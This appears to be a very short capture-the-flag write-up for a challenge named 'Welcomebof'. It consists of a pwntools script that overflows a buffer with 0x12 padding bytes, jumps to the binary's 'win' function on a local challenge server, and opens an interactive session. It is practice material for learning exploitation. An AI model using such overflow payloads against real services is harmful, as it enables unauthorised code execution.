# Welcomebof

ヒント通り

```python
#!/usr/bin/env python3
from pwn import *
binfile = 'chall'
context.log_level = 'critical'
e = ELF(binfile)
context.binary = binfile
io = remote('localhost', 4002)

pad = b'a' * 0x12

payload = pad + pack(e.sym['win'])

io.sendlineafter(b'name?\n', payload)

io.interactive()
```
